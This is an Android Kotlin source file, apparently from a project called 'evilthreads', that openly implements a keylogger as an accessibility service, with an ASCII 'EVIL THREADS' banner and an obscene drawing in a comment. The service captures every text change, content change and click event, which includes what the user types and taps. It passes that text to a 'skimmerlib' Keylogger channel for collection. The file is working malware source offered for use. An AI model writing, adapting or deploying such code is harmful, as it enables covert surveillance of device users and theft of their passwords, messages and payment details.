package com.evilthreads.keylogger

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import com.evilthreads.skimmerlib.Keylogger
import com.evilthreads.skimmerlib.KeyloggerEntry
import kotlinx.coroutines.runBlocking
/*
            (   (                ) (             (     (
            )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
 (   (   ( (()/(()/(  ` )  /( )\()|()/((    )\  (()/( (()/(
 )\  )\  )\ /(_))(_))  ( )(_)|(_)\ /(_))\((((_)( /(_)) /(_))
((_)((_)((_|_))(_))   (_(_()) _((_|_))((_))\ _ )(_))_ (_))
| __\ \ / /|_ _| |    |_   _|| || | _ \ __(_)_\(_)   \/ __|
| _| \ V /  | || |__    | |  | __ |   / _| / _ \ | |) \__ \
|___| \_/  |___|____|   |_|  |_||_|_|_\___/_/ \_\|___/|___/
....................../´¯/)
....................,/¯../
.................../..../
............./´¯/'...'/´¯¯`·¸
........../'/.../..../......./¨¯\
........('(...´...´.... ¯~/'...')
.........\.................'...../
..........''...\.......... _.·´
............\..............(
..............\.............\...
*/
class KeyloggerService: AccessibilityService() {
    override fun onInterrupt() { }
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        StringBuffer().apply {
            when(event?.eventType){
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> this.append(event.text.toString())
                AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT -> this.append(event.text.toString())
                AccessibilityEvent.TYPE_VIEW_CLICKED -> this.append(event.text.toString())
            }
        }.toString().trim().takeIf { it.isNotEmpty() }?.let{ text ->
            runBlocking {
                val entry = KeyloggerEntry(text)
                Keylogger.channel.send(entry)
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
    }
}